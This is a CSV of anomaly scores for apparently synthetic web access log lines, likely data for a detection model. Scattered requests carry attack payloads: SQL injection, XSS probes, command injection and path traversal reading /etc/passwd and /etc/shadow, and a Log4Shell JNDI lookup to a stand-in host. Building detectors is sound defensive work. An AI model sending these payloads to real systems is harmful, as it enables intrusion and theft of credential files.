score_content,score_session,score_fused,score_fused_norm,line
30147.349609375,,30147.349609375,30147.349609375,201.135.23.10 - - [10/Jan/2025:12:09:59 +0000] "GET /search?q=headphones HTTP/1.1" 401 512 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
124.9259262084961,,124.9259262084961,124.9259262084961,230.60.118.10 - - [10/Jan/2025:12:09:59 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 13966 "https://twitter.com/" "python-requests/2.31.0"
24.046875,,24.046875,24.046875,188.112.229.39 - - [10/Jan/2025:12:10:01 +0000] "GET /api/product?id=123 HTTP/1.1" 200 9336 "https://news.ycombinator.com/" "curl/7.85.0"
26.83418083190918,,26.83418083190918,26.83418083190918,128.5.111.232 - - [10/Jan/2025:12:10:03 +0000] "DELETE /contact HTTP/1.1" 200 16693 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11085.37890625,,11085.37890625,11085.37890625,114.218.196.174 - - [10/Jan/2025:12:10:03 +0000] "DELETE /search?q=monitor HTTP/1.1" 502 1167 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
26.63445281982422,,26.63445281982422,26.63445281982422,60.91.164.149 - - [10/Jan/2025:12:10:03 +0000] "POST /search?q=phone HTTP/1.1" 204 10827 "-" "sqlmap/1.7.2#stable"
4.616744518280029,,4.616744518280029,4.616744518280029,103.117.73.194 - - [10/Jan/2025:12:10:06 +0000] "POST /login HTTP/1.1" 200 8186 "-" "dirb/2.22"
0.2625744640827179,,0.2625744640827179,0.2625744640827179,56.200.243.79 - - [10/Jan/2025:12:10:08 +0000] "GET /assets/app.js HTTP/1.1" 200 3518 "https://www.google.com/" "python-requests/2.31.0"
125.06365203857422,,125.06365203857422,125.06365203857422,188.134.37.89 - - [10/Jan/2025:12:10:08 +0000] "TRACE /search?q=camera HTTP/1.1" 204 17363 "https://twitter.com/" "python-requests/2.31.0"
125.0545425415039,,125.0545425415039,125.0545425415039,21.172.93.55 - - [10/Jan/2025:12:10:09 +0000] "TRACE /search?q=camera HTTP/1.1" 200 12241 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
24.059154510498047,,24.059154510498047,24.059154510498047,137.19.13.109 - - [10/Jan/2025:12:10:11 +0000] "GET /search?q=router HTTP/1.1" 200 19317 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30171.876953125,,30171.876953125,30171.876953125,21.177.129.244 - - [10/Jan/2025:12:10:13 +0000] "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 403 1370 "https://news.ycombinator.com/" "nikto/2.5.0"
124.96200561523438,,124.96200561523438,124.96200561523438,242.201.95.7 - - [10/Jan/2025:12:10:13 +0000] "TRACE /search?q=headphones HTTP/1.1" 204 9491 "https://example.com/" "sqlmap/1.7.2#stable"
30247.25,,30247.25,30247.25,172.106.193.132 - - [10/Jan/2025:12:10:13 +0000] "TRACE /search?q=router HTTP/1.1" 403 1353 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
30168.185546875,,30168.185546875,30168.185546875,237.216.83.55 - - [10/Jan/2025:12:10:14 +0000] "HEAD /.env HTTP/1.1" 401 1249 "https://twitter.com/" "nikto/2.5.0"
26.709318161010742,,26.709318161010742,26.709318161010742,150.238.80.153 - - [10/Jan/2025:12:10:14 +0000] "GET /search?q=laptop HTTP/1.1" 304 18125 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
11038.5712890625,,11038.5712890625,11038.5712890625,126.72.17.62 - - [10/Jan/2025:12:10:14 +0000] "GET / HTTP/1.1" 503 760 "https://news.ycombinator.com/" "curl/7.85.0"
101.4283218383789,,101.4283218383789,101.4283218383789,212.141.106.128 - - [10/Jan/2025:12:10:16 +0000] "TRACE /.git/config HTTP/1.1" 200 15275 "https://twitter.com/" "sqlmap/1.7.2#stable"
48.80699157714844,,48.80699157714844,48.80699157714844,220.227.219.61 - - [10/Jan/2025:12:10:17 +0000] "DELETE /search?q=headphones HTTP/1.1" 200 13969 "https://www.google.com/" "nikto/2.5.0"
0.37268131971359253,,0.37268131971359253,0.37268131971359253,10.145.62.44 - - [10/Jan/2025:12:10:17 +0000] "GET /index.html HTTP/1.1" 200 9505 "https://www.google.com/" "dirb/2.22"
34.86684036254883,,34.86684036254883,34.86684036254883,135.184.13.170 - - [10/Jan/2025:12:10:17 +0000] "PUT /search?q=camera HTTP/1.1" 200 2946 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.31679898500442505,,0.31679898500442505,0.31679898500442505,82.76.130.243 - - [10/Jan/2025:12:10:20 +0000] "GET /assets/app.js HTTP/1.1" 200 18185 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
1.8926335573196411,,1.8926335573196411,1.8926335573196411,234.170.119.150 - - [10/Jan/2025:12:10:22 +0000] "GET /phpmyadmin HTTP/1.1" 200 16711 "https://news.ycombinator.com/" "python-requests/2.31.0"
24.008546829223633,,24.008546829223633,24.008546829223633,95.152.244.220 - - [10/Jan/2025:12:10:24 +0000] "GET /search?q=monitor HTTP/1.1" 200 383 "-" "dirb/2.22"
125.0309829711914,,125.0309829711914,125.0309829711914,66.65.185.75 - - [10/Jan/2025:12:10:27 +0000] "TRACE /search?q=router HTTP/1.1" 200 763 "-" "python-requests/2.31.0"
101.38676452636719,,101.38676452636719,101.38676452636719,184.128.26.38 - - [10/Jan/2025:12:10:30 +0000] "TRACE /.git/config HTTP/1.1" 200 3848 "https://www.google.com/" "python-requests/2.31.0"
93.95480346679688,,93.95480346679688,93.95480346679688,111.20.157.165 - - [10/Jan/2025:12:10:32 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 8176 "https://example.com/" "curl/7.85.0"
26.807588577270508,,26.807588577270508,26.807588577270508,222.157.91.69 - - [10/Jan/2025:12:10:34 +0000] "DELETE /contact HTTP/1.1" 200 8843 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30124.185546875,,30124.185546875,30124.185546875,163.216.171.26 - - [10/Jan/2025:12:10:35 +0000] "GET /assets/app.css HTTP/1.1" 404 1343 "https://twitter.com/" "python-requests/2.31.0"
2.233487129211426,,2.233487129211426,2.233487129211426,64.75.88.1 - - [10/Jan/2025:12:10:37 +0000] "GET / HTTP/1.1" 201 3866 "-" "sqlmap/1.7.2#stable"
124.9898910522461,,124.9898910522461,124.9898910522461,18.19.6.31 - - [10/Jan/2025:12:10:40 +0000] "TRACE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 13364 "-" "curl/7.85.0"
0.28656479716300964,,0.28656479716300964,0.28656479716300964,4.136.95.162 - - [10/Jan/2025:12:10:43 +0000] "GET /assets/app.css HTTP/1.1" 200 16374 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
26.703784942626953,,26.703784942626953,26.703784942626953,200.166.118.149 - - [10/Jan/2025:12:10:45 +0000] "DELETE /phpmyadmin HTTP/1.1" 200 7830 "-" "dirb/2.22"
0.30328381061553955,,0.30328381061553955,0.30328381061553955,80.92.190.230 - - [10/Jan/2025:12:10:47 +0000] "GET /assets/app.js HTTP/1.1" 200 13791 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
46.514408111572266,,46.514408111572266,46.514408111572266,230.203.11.43 - - [10/Jan/2025:12:10:47 +0000] "HEAD /profile HTTP/1.1" 200 11946 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.672379493713379,,12.672379493713379,12.672379493713379,75.242.237.19 - - [10/Jan/2025:12:10:48 +0000] "PUT /server-status HTTP/1.1" 200 19759 "https://twitter.com/" "curl/7.85.0"
93.86723327636719,,93.86723327636719,93.86723327636719,45.220.5.146 - - [10/Jan/2025:12:10:48 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 9836 "https://twitter.com/" "nikto/2.5.0"
102.9360122680664,,102.9360122680664,102.9360122680664,235.62.229.227 - - [10/Jan/2025:12:10:48 +0000] "TRACE /dashboard HTTP/1.1" 200 9814 "-" "curl/7.85.0"
125.14160919189453,,125.14160919189453,125.14160919189453,90.32.191.102 - - [10/Jan/2025:12:10:49 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 16114 "https://news.ycombinator.com/" "python-requests/2.31.0"
93.89983367919922,,93.89983367919922,93.89983367919922,82.18.151.30 - - [10/Jan/2025:12:10:49 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 201 16908 "-" "python-requests/2.31.0"
74.4371109008789,,74.4371109008789,74.4371109008789,125.4.245.47 - - [10/Jan/2025:12:10:50 +0000] "OPTIONS /dashboard HTTP/1.1" 301 16240 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.8831100463867188,,1.8831100463867188,1.8831100463867188,220.6.173.65 - - [10/Jan/2025:12:10:52 +0000] "GET /dashboard HTTP/1.1" 200 5518 "-" "dirb/2.22"
124.88618469238281,,124.88618469238281,124.88618469238281,224.114.217.173 - - [10/Jan/2025:12:10:55 +0000] "TRACE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3034 "https://example.com/" "python-requests/2.31.0"
26.512250900268555,,26.512250900268555,26.512250900268555,94.69.16.228 - - [10/Jan/2025:12:10:56 +0000] "POST /search?q=headphones HTTP/1.1" 200 3452 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
30191.400390625,,30191.400390625,30191.400390625,179.253.116.242 - - [10/Jan/2025:12:10:58 +0000] "HEAD /search?q=headphones HTTP/1.1" 403 15 "https://news.ycombinator.com/" "dirb/2.22"
11085.25390625,,11085.25390625,11085.25390625,174.120.207.109 - - [10/Jan/2025:12:10:59 +0000] "DELETE /search?q=monitor HTTP/1.1" 500 1199 "-" "Wget/1.21.2 (linux-gnu)"
125.11084747314453,,125.11084747314453,125.11084747314453,204.247.252.244 - - [10/Jan/2025:12:11:02 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 7100 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
68.58837890625,,68.58837890625,68.58837890625,116.10.90.225 - - [10/Jan/2025:12:11:04 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 17119 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
2.270101308822632,,2.270101308822632,2.270101308822632,80.228.158.82 - - [10/Jan/2025:12:11:05 +0000] "GET / HTTP/1.1" 200 12489 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
71.79529571533203,,71.79529571533203,71.79529571533203,200.96.36.129 - - [10/Jan/2025:12:11:08 +0000] "OPTIONS /api/products HTTP/1.1" 201 3490 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
4.649315357208252,,4.649315357208252,4.649315357208252,43.159.241.69 - - [10/Jan/2025:12:11:09 +0000] "POST /about HTTP/1.1" 200 17754 "https://twitter.com/" "sqlmap/1.7.2#stable"
44.79897689819336,,44.79897689819336,44.79897689819336,50.108.157.50 - - [10/Jan/2025:12:11:10 +0000] "HEAD /../../etc/passwd HTTP/1.1" 200 15447 "https://www.google.com/" "curl/7.85.0"
93.8963851928711,,93.8963851928711,93.8963851928711,44.248.220.134 - - [10/Jan/2025:12:11:11 +0000] "OPTIONS /search?q=monitor HTTP/1.1" 200 3186 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
4.613244533538818,,4.613244533538818,4.613244533538818,21.203.222.244 - - [10/Jan/2025:12:11:14 +0000] "GET /profile HTTP/1.1" 302 14679 "https://twitter.com/" "Wget/1.21.2 (linux-gnu)"
48.82366943359375,,48.82366943359375,48.82366943359375,138.89.2.192 - - [10/Jan/2025:12:11:17 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 1027 "https://www.google.com/" "sqlmap/1.7.2#stable"
1.978373646736145,,1.978373646736145,1.978373646736145,130.181.61.49 - - [10/Jan/2025:12:11:17 +0000] "GET /logout HTTP/1.1" 200 3308 "https://news.ycombinator.com/" "dirb/2.22"
93.9795913696289,,93.9795913696289,93.9795913696289,133.105.54.95 - - [10/Jan/2025:12:11:17 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 200 15575 "https://news.ycombinator.com/" "nikto/2.5.0"
30169.470703125,,30169.470703125,30169.470703125,174.67.94.224 - - [10/Jan/2025:12:11:18 +0000] "HEAD /profile HTTP/1.1" 401 549 "https://twitter.com/" "dirb/2.22"
0.3584478199481964,,0.3584478199481964,0.3584478199481964,39.197.245.68 - - [10/Jan/2025:12:11:20 +0000] "GET /index.html HTTP/1.1" 200 6077 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.31391143798828125,,0.31391143798828125,0.31391143798828125,187.45.19.9 - - [10/Jan/2025:12:11:23 +0000] "GET /assets/app.js HTTP/1.1" 200 17192 "https://news.ycombinator.com/" "curl/7.85.0"
11.055060386657715,,11.055060386657715,11.055060386657715,165.58.207.73 - - [10/Jan/2025:12:11:24 +0000] "PUT /cgi-bin/test.cgi HTTP/1.1" 200 2213 "-" "python-requests/2.31.0"
4.655355453491211,,4.655355453491211,4.655355453491211,177.159.248.210 - - [10/Jan/2025:12:11:27 +0000] "GET /logout HTTP/1.1" 304 5379 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
93.9474868774414,,93.9474868774414,93.9474868774414,212.58.248.155 - - [10/Jan/2025:12:11:30 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 6297 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
26.648229598999023,,26.648229598999023,26.648229598999023,174.248.53.113 - - [10/Jan/2025:12:11:33 +0000] "POST /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 217 "-" "python-requests/2.31.0"
2.256035089492798,,2.256035089492798,2.256035089492798,84.38.92.241 - - [10/Jan/2025:12:11:35 +0000] "GET / HTTP/1.1" 200 8718 "https://www.google.com/" "dirb/2.22"
13.870372772216797,,13.870372772216797,13.870372772216797,98.243.90.249 - - [10/Jan/2025:12:11:35 +0000] "PUT /.git/config HTTP/1.1" 304 8626 "https://twitter.com/" "curl/7.85.0"
47.788394927978516,,47.788394927978516,47.788394927978516,39.215.185.42 - - [10/Jan/2025:12:11:35 +0000] "HEAD /.env HTTP/1.1" 304 6987 "https://www.google.com/" "nikto/2.5.0"
71.97203826904297,,71.97203826904297,71.97203826904297,75.89.67.81 - - [10/Jan/2025:12:11:36 +0000] "OPTIONS /login HTTP/1.1" 200 8476 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
71.05272674560547,,71.05272674560547,71.05272674560547,123.179.82.206 - - [10/Jan/2025:12:11:37 +0000] "HEAD /search?q=headphones HTTP/1.1" 301 9505 "https://www.google.com/" "python-requests/2.31.0"
0.23105712234973907,,0.23105712234973907,0.23105712234973907,213.244.119.169 - - [10/Jan/2025:12:11:37 +0000] "GET /cgi-bin/test.cgi HTTP/1.1" 200 13024 "-" "python-requests/2.31.0"
11.429048538208008,,11.429048538208008,11.429048538208008,14.244.98.198 - - [10/Jan/2025:12:11:40 +0000] "PUT /.env HTTP/1.1" 200 3833 "https://twitter.com/" "python-requests/2.31.0"
71.96073150634766,,71.96073150634766,71.96073150634766,68.111.181.190 - - [10/Jan/2025:12:11:40 +0000] "OPTIONS /login HTTP/1.1" 200 5670 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
48.8843994140625,,48.8843994140625,48.8843994140625,28.130.76.145 - - [10/Jan/2025:12:11:40 +0000] "DELETE /search?q=router HTTP/1.1" 200 13782 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
12.771376609802246,,12.771376609802246,12.771376609802246,68.206.204.129 - - [10/Jan/2025:12:11:40 +0000] "PUT /api/products HTTP/1.1" 200 18166 "https://www.google.com/" "dirb/2.22"
68.61138153076172,,68.61138153076172,68.61138153076172,174.190.106.152 - - [10/Jan/2025:12:11:40 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 6302 "https://news.ycombinator.com/" "nikto/2.5.0"
0.2675749361515045,,0.2675749361515045,0.2675749361515045,206.171.54.124 - - [10/Jan/2025:12:11:40 +0000] "GET /assets/app.js HTTP/1.1" 200 794 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11059.91796875,,11059.91796875,11059.91796875,232.176.205.85 - - [10/Jan/2025:12:11:41 +0000] "GET /search?q=phone HTTP/1.1" 500 1131 "https://twitter.com/" "curl/7.85.0"
93.90723419189453,,93.90723419189453,93.90723419189453,47.203.92.54 - - [10/Jan/2025:12:11:43 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 18842 "https://example.com/" "dirb/2.22"
71.07152557373047,,71.07152557373047,71.07152557373047,253.5.24.209 - - [10/Jan/2025:12:11:46 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 302 7733 "https://example.com/" "python-requests/2.31.0"
2.0481317043304443,,2.0481317043304443,2.0481317043304443,208.218.124.237 - - [10/Jan/2025:12:11:49 +0000] "GET /admin HTTP/1.1" 200 10959 "https://twitter.com/" "curl/7.85.0"
26.735563278198242,,26.735563278198242,26.735563278198242,239.125.120.249 - - [10/Jan/2025:12:11:52 +0000] "DELETE /api/products HTTP/1.1" 200 11507 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
11.06359577178955,,11.06359577178955,11.06359577178955,203.247.195.216 - - [10/Jan/2025:12:11:53 +0000] "PUT /../../etc/passwd HTTP/1.1" 200 4679 "https://twitter.com/" "python-requests/2.31.0"
0.28050512075424194,,0.28050512075424194,0.28050512075424194,70.188.194.238 - - [10/Jan/2025:12:11:54 +0000] "GET /assets/app.css HTTP/1.1" 200 14439 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
93.94139862060547,,93.94139862060547,93.94139862060547,125.52.235.175 - - [10/Jan/2025:12:11:54 +0000] "OPTIONS /search?q=camera HTTP/1.1" 200 9434 "https://www.google.com/" "curl/7.85.0"
93.97602844238281,,93.97602844238281,93.97602844238281,161.104.240.27 - - [10/Jan/2025:12:11:55 +0000] "OPTIONS /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 16998 "https://twitter.com/" "python-requests/2.31.0"
51.48948669433594,,51.48948669433594,51.48948669433594,16.139.160.79 - - [10/Jan/2025:12:11:58 +0000] "DELETE /search?q=router HTTP/1.1" 302 17598 "-" "Wget/1.21.2 (linux-gnu)"
25.185575485229492,,25.185575485229492,25.185575485229492,4.1.208.119 - - [10/Jan/2025:12:11:58 +0000] "DELETE /wp-login.php HTTP/1.1" 200 13237 "https://www.google.com/" "python-requests/2.31.0"
30171.8046875,,30171.8046875,30171.8046875,31.122.213.230 - - [10/Jan/2025:12:12:01 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 403 604 "-" "nikto/2.5.0"
30169.591796875,,30169.591796875,30169.591796875,107.221.182.138 - - [10/Jan/2025:12:12:04 +0000] "HEAD /about HTTP/1.1" 401 216 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
11.180551528930664,,11.180551528930664,11.180551528930664,18.245.25.29 - - [10/Jan/2025:12:12:04 +0000] "PUT /.git/config HTTP/1.1" 200 2765 "-" "sqlmap/1.7.2#stable"
29.16899299621582,,29.16899299621582,29.16899299621582,162.190.241.187 - - [10/Jan/2025:12:12:06 +0000] "POST /search?q=camera HTTP/1.1" 301 3222 "https://twitter.com/" "nikto/2.5.0"
26.689964294433594,,26.689964294433594,26.689964294433594,240.20.82.145 - - [10/Jan/2025:12:12:09 +0000] "GET /search?q=ssd HTTP/1.1" 302 2461 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
103.08792114257812,,103.08792114257812,103.08792114257812,130.166.158.41 - - [10/Jan/2025:12:12:11 +0000] "TRACE /login HTTP/1.1" 200 12317 "-" "Wget/1.21.2 (linux-gnu)"
124.99823760986328,,124.99823760986328,124.99823760986328,16.106.222.134 - - [10/Jan/2025:12:12:14 +0000] "TRACE /search?q=monitor HTTP/1.1" 200 2825 "https://example.com/" "dirb/2.22"
34.95615768432617,,34.95615768432617,34.95615768432617,67.216.131.36 - - [10/Jan/2025:12:12:14 +0000] "PUT /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 5102 "https://example.com/" "dirb/2.22"
0.25765538215637207,,0.25765538215637207,0.25765538215637207,38.201.111.11 - - [10/Jan/2025:12:12:15 +0000] "GET /assets/app.css HTTP/1.1" 200 456 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.3052588701248169,,0.3052588701248169,0.3052588701248169,243.155.81.72 - - [10/Jan/2025:12:12:16 +0000] "GET /assets/app.js HTTP/1.1" 200 14394 "https://twitter.com/" "sqlmap/1.7.2#stable"
125.07707977294922,,125.07707977294922,125.07707977294922,153.142.166.114 - - [10/Jan/2025:12:12:16 +0000] "TRACE /search?q=camera HTTP/1.1" 200 19927 "-" "sqlmap/1.7.2#stable"
93.88428497314453,,93.88428497314453,93.88428497314453,36.252.149.143 - - [10/Jan/2025:12:12:16 +0000] "OPTIONS /search?q=headphones HTTP/1.1" 200 306 "https://example.com/" "python-requests/2.31.0"
24.049440383911133,,24.049440383911133,24.049440383911133,221.243.164.58 - - [10/Jan/2025:12:12:19 +0000] "GET /search?q=camera HTTP/1.1" 200 15957 "https://www.google.com/" "Wget/1.21.2 (linux-gnu)"
26.75751304626465,,26.75751304626465,26.75751304626465,106.226.6.208 - - [10/Jan/2025:12:12:22 +0000] "DELETE /api/products HTTP/1.1" 200 18523 "https://www.google.com/" "python-requests/2.31.0"
51.46379089355469,,51.46379089355469,51.46379089355469,236.165.222.177 - - [10/Jan/2025:12:12:23 +0000] "DELETE /api/product?id=123 HTTP/1.1" 302 934 "https://twitter.com/" "dirb/2.22"
68.75275421142578,,68.75275421142578,68.75275421142578,106.245.89.140 - - [10/Jan/2025:12:12:23 +0000] "HEAD /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1" 200 16264 "https://example.com/" "dirb/2.22"
26.676025390625,,26.676025390625,26.676025390625,222.74.67.59 - - [10/Jan/2025:12:12:24 +0000] "POST /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 3314 "https://example.com/" "dirb/2.22"
26.639448165893555,,26.639448165893555,26.639448165893555,184.88.34.155 - - [10/Jan/2025:12:12:24 +0000] "POST /search?q=camera HTTP/1.1" 200 17390 "https://example.com/" "python-requests/2.31.0"
0.35501912236213684,,0.35501912236213684,0.35501912236213684,199.146.174.32 - - [10/Jan/2025:12:12:24 +0000] "GET /index.html HTTP/1.1" 200 5299 "https://twitter.com/" "curl/7.85.0"
30125.8828125,,30125.8828125,30125.8828125,104.15.53.212 - - [10/Jan/2025:12:12:26 +0000] "GET /login HTTP/1.1" 404 426 "https://example.com/" "python-requests/2.31.0"
7.000673294067383,,7.000673294067383,7.000673294067383,30.8.125.157 - - [10/Jan/2025:12:12:28 +0000] "POST /server-status HTTP/1.1" 302 15125 "https://news.ycombinator.com/" "curl/7.85.0"
34.88775634765625,,34.88775634765625,34.88775634765625,124.87.28.134 - - [10/Jan/2025:12:12:29 +0000] "PUT /search?q=phone HTTP/1.1" 201 2790 "https://www.google.com/" "curl/7.85.0"
26.53236198425293,,26.53236198425293,26.53236198425293,121.217.144.181 - - [10/Jan/2025:12:12:29 +0000] "GET /search?q=headphones HTTP/1.1" 301 5702 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
68.55844116210938,,68.55844116210938,68.55844116210938,80.119.55.2 - - [10/Jan/2025:12:12:31 +0000] "HEAD /search?q=monitor HTTP/1.1" 200 19723 "https://twitter.com/" "nikto/2.5.0"
30191.064453125,,30191.064453125,30191.064453125,111.23.188.193 - - [10/Jan/2025:12:12:34 +0000] "HEAD /search?q=router HTTP/1.1" 400 1167 "-" "curl/7.85.0"
125.02861785888672,,125.02861785888672,125.02861785888672,240.12.212.146 - - [10/Jan/2025:12:12:34 +0000] "TRACE /search?q=laptop HTTP/1.1" 200 5296 "https://www.google.com/" "nikto/2.5.0"
30191.068359375,,30191.068359375,30191.068359375,96.145.15.69 - - [10/Jan/2025:12:12:37 +0000] "HEAD /search?q=router HTTP/1.1" 400 987 "https://news.ycombinator.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30216.486328125,,30216.486328125,30216.486328125,250.150.52.5 - - [10/Jan/2025:12:12:40 +0000] "OPTIONS /search?q=phone HTTP/1.1" 404 271 "https://news.ycombinator.com/" "nikto/2.5.0"
102.91252136230469,,102.91252136230469,102.91252136230469,50.249.65.118 - - [10/Jan/2025:12:12:41 +0000] "TRACE /api/products HTTP/1.1" 200 7271 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
12.952441215515137,,12.952441215515137,12.952441215515137,88.51.108.185 - - [10/Jan/2025:12:12:43 +0000] "PUT /about HTTP/1.1" 200 139 "https://news.ycombinator.com/" "dirb/2.22"
48.74072265625,,48.74072265625,48.74072265625,88.126.246.95 - - [10/Jan/2025:12:12:43 +0000] "DELETE /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 11963 "https://news.ycombinator.com/" "dirb/2.22"
72.00701141357422,,72.00701141357422,72.00701141357422,223.147.53.137 - - [10/Jan/2025:12:12:46 +0000] "OPTIONS /admin HTTP/1.1" 200 19351 "https://news.ycombinator.com/" "python-requests/2.31.0"
11085.39453125,,11085.39453125,11085.39453125,184.96.50.2 - - [10/Jan/2025:12:12:48 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 500 934 "-" "nikto/2.5.0"
